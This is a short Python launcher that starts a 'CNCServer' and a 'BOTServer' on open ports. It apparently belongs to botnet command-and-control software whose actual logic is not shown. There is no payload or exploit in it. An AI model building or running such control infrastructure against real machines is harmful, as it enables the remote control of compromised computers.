from src import *
from time import sleep

if __name__ == '__main__':
    CNCServer('0.0.0.0', 5555).run()
    BOTServer('0.0.0.0', 5556).run()

    while 1:
        try:
            sleep(.1)
        except KeyboardInterrupt:
            exit(0)